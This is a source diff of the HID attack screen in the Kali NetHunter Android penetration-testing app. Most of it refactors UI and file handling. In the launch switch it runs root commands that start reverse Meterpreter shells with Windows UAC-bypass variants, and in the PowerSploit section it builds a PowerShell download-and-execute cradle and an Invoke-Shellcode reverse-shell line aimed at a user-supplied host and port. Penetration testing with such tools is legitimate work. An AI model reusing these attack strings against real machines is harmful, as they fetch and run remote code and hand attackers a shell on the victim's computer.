@@ -1,8 +1,18 @@
 package com.offsec.nethunter;
 
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.FileReader;
+import java.io.IOException;
+import java.io.OutputStreamWriter;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
 import android.app.ActionBar;
 import android.app.Activity;
 import android.app.AlertDialog;
+//import android.app.Fragment;
 import android.app.FragmentTransaction;
 import android.content.Context;
 import android.content.DialogInterface;
@@ -11,11 +21,14 @@ import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
 import android.net.Uri;
 import android.os.Bundle;
+import android.os.Environment;
 import android.os.Parcelable;
 import android.support.v4.app.Fragment;
+//import android.support.v4.app.FragmentActivity;
 import android.support.v4.app.FragmentManager;
 import android.support.v4.app.FragmentStatePagerAdapter;
 import android.support.v4.view.ViewPager;
+import android.util.Log;
 import android.view.LayoutInflater;
 import android.view.Menu;
 import android.view.MenuInflater;
@@ -28,27 +41,15 @@ import android.widget.Button;
 import android.widget.EditText;
 import android.widget.Spinner;
 
-import com.offsec.nethunter.utils.NhPaths;
-import com.offsec.nethunter.utils.ShellExecuter;
-
-import java.io.File;
-import java.io.FileOutputStream;
-import java.io.OutputStreamWriter;
-import java.util.regex.Matcher;
-import java.util.regex.Pattern;
-
-//import android.app.Fragment;
-//import android.support.v4.app.FragmentActivity;
-
 public class HidFragment extends Fragment implements ActionBar.TabListener {
 
     TabsPagerAdapter TabsPagerAdapter;
     ViewPager mViewPager;
     SharedPreferences sharedpreferences;
-    static NhPaths nh;
-    final CharSequence[] platforms = {"No UAC Bypass", "Windows 7", "Windows 8", "Windows 10"};
+
+    final CharSequence[] platforms = {"No UAC Bypass", "Windows 7", "Windows 8"};
     final CharSequence[] languages = {"American English", "Belgian", "British English", "Danish", "French", "German", "Italian", "Norwegian", "Portugese", "Russian", "Spanish", "Swedish"};
-    private String configFilePath;
+    private static final String configFilePath = "/data/local/kali-armhf/var/www/payload";
 
     private static final String ARG_SECTION_NUMBER = "section_number";
 
@@ -65,17 +66,9 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
     }
 
     @Override
-    public void onActivityCreated(Bundle savedInstanceState) {
-        configFilePath =   nh.CHROOT_PATH + "/var/www/html/powersploit-payload";;
-        super.onActivityCreated(savedInstanceState);
-    }
-
-    @Override
     public void onAttach(Activity activity) {
         super.onAttach(activity);
-        if (isAdded()) {
-            nh = new NhPaths();
-        }
+        ((AppNavHomeActivity) activity).onSectionAttached(getArguments().getInt(ARG_SECTION_NUMBER));
     }
 
     @Override
@@ -133,6 +126,7 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
             case R.id.source_button:
                 Intent i = new Intent(getActivity(), EditSourceActivity.class);
                 i.putExtra("path", configFilePath);
+                i.putExtra("shell", true);
                 startActivity(i);
                 return true;
             default:
@@ -188,41 +182,29 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
         if (pageNum == 0) {
             switch (UACBypassIndex) {
                 case 0:
-                    command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali start-rev-met --" + lang + "'";
+                    command[0] = "su -c \"bootkali start-rev-met --" + lang + "\"";
                     break;
                 case 1:
-                    command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali start-rev-met-elevated-win7 --" + lang + "'";
-                    break;
-                case 2:
-                    command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali start-rev-met-elevated-win8 --" + lang + "'";
-                    break;
-                case 3:
-                    command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali start-rev-met-elevated-win10 --" + lang + "'";
+                    command[0] = "su -c \"bootkali start-rev-met-elevated-win7 --" + lang + "\"";
                     break;
                 default:
-                    nh.showMessage("No option selected 1");
+                    command[0] = "su -c \"bootkali start-rev-met-elevated-win8 --" + lang + "\"";
                     break;
             }
         } else if (pageNum == 1) {
             switch (UACBypassIndex) {
                 case 0:
-                    command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali hid-cmd --" + lang + "'";
+                    command[0] = "su -c \"bootkali hid-cmd --" + lang + "\"";
                     break;
                 case 1:
-                    command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali hid-cmd-elevated-win7 --" + lang + "'";
-                    break;
-                case 2:
-                    command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali hid-cmd-elevated-win8 --" + lang + "'";
-                    break;
-                case 3:
-                    command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali hid-cmd-elevated-win10 --" + lang + "'";
+                    command[0] = "su -c \"bootkali hid-cmd-elevated-win7 --" + lang + "\"";
                     break;
                 default:
-                    nh.showMessage("No option selected 2");
+                    command[0] = "su -c \"bootkali hid-cmd-elevated-win8 --" + lang + "\"";
                     break;
             }
         }
-        nh.showMessage("Attack launched...");
+        ((AppNavHomeActivity) getActivity()).showMessage("Attack launched...");
         new Thread(new Runnable() {
             public void run() {
                 ShellExecuter exe = new ShellExecuter();
@@ -232,7 +214,7 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
                     @Override
                     public void run() {
 
-                        nh.showMessage("Attack execution ended.");
+                        ((AppNavHomeActivity) getActivity()).showMessage("Attack execution ended.");
                     }
                 });
             }
@@ -244,7 +226,7 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
         ShellExecuter exe = new ShellExecuter();
         String[] command = {"stop-badusb"};
         exe.RunAsRoot(command);
-        nh.showMessage("Reseting USB");
+        ((AppNavHomeActivity) getActivity()).showMessage("Reseting USB");
     }
 
 
@@ -353,15 +335,10 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
         }
     }
 
-    public static class PowerSploitFragment extends HidFragment implements OnClickListener {
+    public static class PowerSploitFragment extends Fragment implements OnClickListener {
 
-        private String configFilePath =  nh.CHROOT_PATH + "/var/www/html/powersploit-payload";
-        private String configFileUrlPath = nh.CHROOT_PATH + "/var/www/html/powersploit-url";
-
-        @Override
-        public void onActivityCreated(Bundle savedInstanceState) {
-            super.onActivityCreated(savedInstanceState);
-        }
+        private String configFilePath = "/data/local/kali-armhf/var/www/payload";
+        private String configFileUrlPath = "files/powersploit-url";
 
         @Override
         public View onCreateView(LayoutInflater inflater, ViewGroup container,
@@ -369,133 +346,166 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
             View rootView = inflater.inflate(R.layout.hid_powersploit, container, false);
             Button b = (Button) rootView.findViewById(R.id.powersploitOptionsUpdate);
             b.setOnClickListener(this);
-            loadOptions(rootView);
             return rootView;
+        }
+
+        @Override
+        public void onResume() {
+            super.onResume();
+            loadOptions();
         }
 
         public void onClick(View v) {
             switch (v.getId()) {
                 case R.id.powersploitOptionsUpdate:
-                    if(getView() == null){
+                    try {
+                        File sdcard = Environment.getExternalStorageDirectory();
+                        File myFile = new File(sdcard, configFileUrlPath);
+                        myFile.createNewFile();
+
+                        FileOutputStream fOut = new FileOutputStream(myFile);
+                        OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut);
+                        EditText newPayloadUrl = (EditText) getView().getRootView().findViewById(R.id.payloadUrl);
+
+                        String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\")";
+                        myOutWriter.append(newText);
+                        myOutWriter.close();
+                        fOut.close();
+                    } catch (Exception e) {
+                        ((AppNavHomeActivity) getActivity()).showMessage(e.getMessage());
                         return;
                     }
-                    ShellExecuter exe = new ShellExecuter();
-                    EditText newPayloadUrl = (EditText) getView().getRootView().findViewById(R.id.payloadUrl);
-                    String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\")";
-                    Boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
-                    if (!isSaved){
-                         nh.showMessage("Source not updated (configFileUrlPath)");
-                    }
+
+
                     EditText ip = (EditText) getView().findViewById(R.id.ipaddress);
                     EditText port = (EditText) getView().findViewById(R.id.port);
 
                     Spinner payload = (Spinner) getView().findViewById(R.id.payload);
                     String payloadValue = payload.getSelectedItem().toString();
+
                     String newString = "Invoke-Shellcode -Payload " + payloadValue + " -Lhost " + ip.getText() + " -Lport " + port.getText() + " -Force";
 
-                    String source = exe.ReadFile_SYNC(configFilePath);
+
+                    ShellExecuter exe = new ShellExecuter();
+                    String source = exe.Executer("cat " + configFilePath);
+
                     String regExPat = "^Invoke-Shellcode -Payload(.*)$";
                     Pattern pattern = Pattern.compile(regExPat, Pattern.MULTILINE);
                     Matcher matcher = pattern.matcher(source);
                     // NEVER MATCH? YES IT DOES!
                     if (matcher.find()) {
                         source = source.replace(matcher.group(0), newString);
-                        isSaved = exe.SaveFileContents(source, configFilePath);
-                        if(isSaved){
-                            nh.showMessage("Options updated!");
-                        } else {
-                            nh.showMessage("Options not updated! (configFilePath)");
-                        }
+                        String[] command = {"sh", "-c", "cat <<'EOF' > " + configFilePath + "\n" + source + "\nEOF"};
+                        exe.RunAsRoot(command);
+                        ((AppNavHomeActivity) getActivity()).showMessage("Options updated!");
                     } else {
-                        nh.showMessage("Options not updated! (missing options)");
+                        ((AppNavHomeActivity) getActivity()).showMessage("Options not updated!");
                     }
                     break;
                 default:
-                    nh.showMessage("Unknown click");
+                    ((AppNavHomeActivity) getActivity()).showMessage("Unknown click");
                     break;
             }
         }
-        private void loadOptions(final View rootView) {
-            final EditText payloadUrl = (EditText) rootView.findViewById(R.id.payloadUrl);
-            final EditText port = (EditText) rootView.findViewById(R.id.port);
-            final Spinner payload = (Spinner) rootView.findViewById(R.id.payload);
-            final ShellExecuter exe = new ShellExecuter();
 
-            new Thread(new Runnable() {
-                public void run() {
-                    final String textUrl = exe.ReadFile_SYNC(configFileUrlPath);
-                    final String text = exe.ReadFile_SYNC(configFilePath);
-                    String regExPatPayloadUrl = "DownloadString\\(\"(.*)\"\\)";
-                    Pattern patternPayloadUrl = Pattern.compile(regExPatPayloadUrl, Pattern.MULTILINE);
-                    final Matcher matcherPayloadUrl = patternPayloadUrl.matcher(textUrl);
 
-                    String[] lines = text.split("\n");
-                    final String line = lines[lines.length - 1];
-
-                    String regExPatIp = "-Lhost\\ (.*)\\ -Lport";
-                    Pattern patternIp = Pattern.compile(regExPatIp, Pattern.MULTILINE);
-                    final Matcher matcherIp = patternIp.matcher(line);
-
-                    String regExPatPort = "-Lport\\ (.*)\\ -Force";
-                    Pattern patternPort = Pattern.compile(regExPatPort, Pattern.MULTILINE);
-                    final Matcher matcherPort = patternPort.matcher(line);
-
-                    String regExPatPayload = "-Payload\\ (.*)\\ -Lhost";
-                    Pattern patternPayload = Pattern.compile(regExPatPayload, Pattern.MULTILINE);
-                    final Matcher matcherPayload = patternPayload.matcher(line);
-
-                    payloadUrl.post(new Runnable() {
-                        @Override
-                        public void run() {
-
-                            if (matcherPayloadUrl.find()) {
-                                String payloadUrlValue = matcherPayloadUrl.group(1);
-                                payloadUrl.setText(payloadUrlValue);
-                            }
-
-                            if (matcherIp.find()) {
-                                String ipValue = matcherIp.group(1);
-                                EditText ip = (EditText) rootView.findViewById(R.id.ipaddress);
-                                ip.setText(ipValue);
-                            }
-
-                            if (matcherPort.find()) {
-                                String portValue = matcherPort.group(1);
-                                port.setText(portValue);
-                            }
-
-                            if (matcherPayload.find()) {
-                                String payloadValue = matcherPayload.group(1);
-                                ArrayAdapter myAdap = (ArrayAdapter) payload.getAdapter();
-                                int spinnerPosition;
-                                spinnerPosition = myAdap.getPosition(payloadValue);
-                                payload.setSelection(spinnerPosition);
-                            }
-                        }
-                    });
+        private void loadOptions() {
+            File sdcard = Environment.getExternalStorageDirectory();
+            File file = new File(sdcard, configFileUrlPath);
+            StringBuilder textUrl = new StringBuilder();
+            try {
+                BufferedReader br = new BufferedReader(new FileReader(file));
+                String line;
+                while ((line = br.readLine()) != null) {
+                    textUrl.append(line);
+                    textUrl.append('\n');
                 }
-            }).start();
+                br.close();
+
+                EditText payloadUrl = (EditText) getView().findViewById(R.id.payloadUrl);
+
+                String regExPatPayloadUrl = "DownloadString\\(\"(.*)\"\\)";
+                Pattern patternPayloadUrl = Pattern.compile(regExPatPayloadUrl, Pattern.MULTILINE);
+                Matcher matcherPayloadUrl = patternPayloadUrl.matcher(textUrl);
+                if (matcherPayloadUrl.find()) {
+                    String payloadUrlValue = matcherPayloadUrl.group(1);
+                    payloadUrl.setText(payloadUrlValue);
+                }
+
+            } catch (IOException e) {
+                Log.e("Nethunter", "exception", e);
+            }
+
+            ShellExecuter exe = new ShellExecuter();
+            String text = exe.Executer("cat " + configFilePath);
+
+
+            String[] lines = text.split("\n");
+            String line = lines[lines.length - 1];
+
+
+            String regExPatIp = "-Lhost\\ (.*)\\ -Lport";
+            Pattern patternIp = Pattern.compile(regExPatIp, Pattern.MULTILINE);
+            Matcher matcherIp = patternIp.matcher(line);
+            if (matcherIp.find()) {
+                String ipValue = matcherIp.group(1);
+                EditText ip = (EditText) getView().findViewById(R.id.ipaddress);
+                ip.setText(ipValue);
+            }
+
+
+            String regExPatPort = "-Lport\\ (.*)\\ -Force";
+            Pattern patternPort = Pattern.compile(regExPatPort, Pattern.MULTILINE);
+            Matcher matcherPort = patternPort.matcher(line);
+            if (matcherPort.find()) {
+                String portValue = matcherPort.group(1);
+                EditText port = (EditText) getView().findViewById(R.id.port);
+                port.setText(portValue);
+            }
+
+            String regExPatPayload = "-Payload\\ (.*)\\ -Lhost";
+            Pattern patternPayload = Pattern.compile(regExPatPayload, Pattern.MULTILINE);
+            Matcher matcherPayload = patternPayload.matcher(line);
+            if (matcherPayload.find()) {
+                String payloadValue = matcherPayload.group(1);
+
+                Spinner payload = (Spinner) getView().findViewById(R.id.payload);
+                ArrayAdapter myAdap = (ArrayAdapter) payload.getAdapter();
+
+                int spinnerPosition;
+                spinnerPosition = myAdap.getPosition(payloadValue);
+                payload.setSelection(spinnerPosition);
+            }
         }
     }
 
 
-    public static class WindowsCmdFragment extends HidFragment implements OnClickListener {
+    public static class WindowsCmdFragment extends Fragment implements OnClickListener {
 
-        private String configFilePath = nh.APP_SD_FILES_PATH + "/configs/hid-cmd.conf";
-        private String loadFilePath =  nh.APP_SD_FILES_PATH + "/scripts/hid/";
-        ShellExecuter exe = new ShellExecuter();
-        @Override
-        public void onActivityCreated(Bundle savedInstanceState) {
-
-            super.onActivityCreated(savedInstanceState);
-        }
+        private String configFilePath = "files/hid-cmd.conf";
+        private String loadFilePath = "files/scripts/hid/";
 
         @Override
         public View onCreateView(LayoutInflater inflater, ViewGroup container,
                                  Bundle savedInstanceState) {
             View rootView = inflater.inflate(R.layout.hid_windows_cmd, container, false);
             EditText source = (EditText) rootView.findViewById(R.id.windowsCmdSource);
-            exe.ReadFile_ASYNC(configFilePath, source);
+            File sdcard = Environment.getExternalStorageDirectory();
+            File file = new File(sdcard, configFilePath);
+            StringBuilder text = new StringBuilder();
+            try {
+                BufferedReader br = new BufferedReader(new FileReader(file));
+                String line;
+                while ((line = br.readLine()) != null) {
+                    text.append(line);
+                    text.append('\n');
+                }
+                br.close();
+            } catch (IOException e) {
+                Log.e("Nethunter", "exception", e);
+            }
+            source.setText(text);
+
             Button b = (Button) rootView.findViewById(R.id.windowsCmdUpdate);
             Button b1 = (Button) rootView.findViewById(R.id.windowsCmdLoad);
             Button b2 = (Button) rootView.findViewById(R.id.windowsCmdSave);
@@ -508,38 +518,44 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
         private static final int PICKFILE_RESULT_CODE = 1;
 
         public void onClick(View v) {
-
             switch (v.getId()) {
                 case R.id.windowsCmdUpdate:
-                    if(getView() == null){
-                        return;
-                    }
                     EditText source = (EditText) getView().findViewById(R.id.windowsCmdSource);
                     String text = source.getText().toString();
-                    Boolean isSaved = exe.SaveFileContents(text, configFilePath);
-                    if(isSaved){
-                        nh.showMessage("Source updated");
+                    try {
+                        File sdcard = Environment.getExternalStorageDirectory();
+                        File myFile = new File(sdcard, configFilePath);
+                        myFile.createNewFile();
+                        FileOutputStream fOut = new FileOutputStream(myFile);
+                        OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut);
+                        myOutWriter.append(text);
+                        myOutWriter.close();
+                        fOut.close();
+                        ((AppNavHomeActivity) getActivity()).showMessage("Source updated");
+                    } catch (Exception e) {
+                        ((AppNavHomeActivity) getActivity()).showMessage(e.getMessage());
                     }
-
                     break;
                 case R.id.windowsCmdLoad:
                     try {
-                        File scriptsDir = new File(nh.APP_SD_FILES_PATH,loadFilePath);
+                        File sdcard = Environment.getExternalStorageDirectory();
+                        File scriptsDir = new File(sdcard,loadFilePath);
                         if(!scriptsDir.exists()) scriptsDir.mkdirs();
                     } catch (Exception e) {
-                        nh.showMessage(e.getMessage());
+                        ((AppNavHomeActivity) getActivity()).showMessage(e.getMessage());
                     }
                     Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
-                    Uri selectedUri = Uri.parse(nh.APP_SD_FILES_PATH + loadFilePath);
+                    Uri selectedUri = Uri.parse(Environment.getExternalStorageDirectory() +"/"+ loadFilePath);
                     intent.setDataAndType(selectedUri, "file/*");
                     startActivityForResult(intent, PICKFILE_RESULT_CODE);
                     break;
                 case R.id.windowsCmdSave:
 					 try {
-                        File scriptsDir = new File(nh.APP_SD_FILES_PATH,loadFilePath);
+                        File sdcard = Environment.getExternalStorageDirectory();
+                        File scriptsDir = new File(sdcard,loadFilePath);
                         if(!scriptsDir.exists()) scriptsDir.mkdirs();
                     } catch (Exception e) {
-                         nh.showMessage(e.getMessage());
+                        ((AppNavHomeActivity) getActivity()).showMessage(e.getMessage());
                     }
                     AlertDialog.Builder alert = new AlertDialog.Builder(getActivity());
 
@@ -553,9 +569,11 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
                     alert.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
                         public void onClick(DialogInterface dialog, int whichButton) {
                             String value = input.getText().toString();
-                            if(!value.equals("") && value.length() >0){
+                            if(value != null && value.length() >0){
                             //FIXME Save file (ask name)
-                                File scriptFile = new File(loadFilePath + File.separator +  value +".conf");
+                                File sdcard = Environment.getExternalStorageDirectory();
+                                File scriptFile = new File(sdcard + File.separator + loadFilePath + File.separator +  value +".conf");
+                                System.out.println(scriptFile.getAbsolutePath());
                                 if(!scriptFile.exists()){
                                     try {
                                         if(getView() == null){
@@ -569,18 +587,19 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
                                         myOutWriter.append(text);
                                         myOutWriter.close();
                                         fOut.close();
-                                        nh.showMessage("Script saved");
+                                        ((AppNavHomeActivity) getActivity()).showMessage("Script saved");
                                     } catch (Exception e) {
-                                        nh.showMessage(e.getMessage());
+                                        ((AppNavHomeActivity) getActivity()).showMessage(e.getMessage());
                                     }
                                 }else{
-                                    nh.showMessage("File already exists");
+                                    ((AppNavHomeActivity) getActivity()).showMessage("File already exists");
                                 }
                             }else{
-                                nh.showMessage("Wrong name provided");
+                                ((AppNavHomeActivity) getActivity()).showMessage("Wrong name provided");
                             }
                         }
                     });
+
                     alert.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                         public void onClick(DialogInterface dialog, int whichButton) {
                            ///Do nothing
@@ -589,7 +608,7 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
                     alert.show();
                     break;
                 default:
-                    nh.showMessage("Unknown click");
+                    ((AppNavHomeActivity) getActivity()).showMessage("Unknown click");
                     break;
             }
         }
@@ -598,13 +617,26 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
         public void onActivityResult(int requestCode, int resultCode, Intent data) {
             switch (requestCode) {
                 case PICKFILE_RESULT_CODE:
-                    if (resultCode == Activity.RESULT_OK && getView() != null) {
+                    if (resultCode == Activity.RESULT_OK) {
                         String FilePath = data.getData().getPath();
                         EditText source = (EditText) getView().findViewById(R.id.windowsCmdSource);
-                        exe.ReadFile_ASYNC(FilePath, source);
-                        nh.showMessage("Script loaded");
+                        try {
+                            String text = "";
+                            BufferedReader br = new BufferedReader(new FileReader(FilePath));
+                            String line;
+                            while ((line = br.readLine()) != null) {
+                                text += line + '\n';
+                            }
+                            br.close();
+                            source.setText(text);
+                            ((AppNavHomeActivity) getActivity()).showMessage("Script loaded");
+                        } catch (Exception e) {
+                            ((AppNavHomeActivity) getActivity()).showMessage(e.getMessage());
+                        }
+                        break;
                     }
                     break;
+
             }
         }
     }
